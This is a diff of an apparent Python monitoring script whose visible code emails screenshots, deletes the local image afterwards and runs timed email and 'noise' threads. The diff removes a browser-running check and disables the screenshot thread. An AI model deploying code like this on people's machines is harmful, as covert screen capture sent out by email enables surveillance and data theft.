@@ -79,8 +79,8 @@ def screenshot_email(subject):
         file_data = f.read()
         file_type = imghdr.what(f.name)
         file_name = f.name
-    # if os.path.isfile('screenshot.bmp'):
-    #    os.remove('screenshot.bmp')
+    if os.path.isfile('screenshot.bmp'):
+        os.remove('screenshot.bmp')
 
     msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
     mailobj.send_message(msg)
@@ -141,8 +141,8 @@ class Plainmain(Thread):
     def run(self):
         
         while True:
-            if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-                plain_email()
+            # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
+            plain_email()
             sleep(time_interval_noise_mail)
 
 
@@ -153,8 +153,8 @@ class Noise(Thread):
         self.start()
     def run(self):
         while True:
-            if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-                noise()
+            # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
+            noise()
             sleep(time_web_noise)
 
 
@@ -162,7 +162,7 @@ class Noise(Thread):
 
 
 if __name__ == '__main__':
-    Screenshot()
+    # Screenshot()
     Noise()
     Plainmain()
     while True:
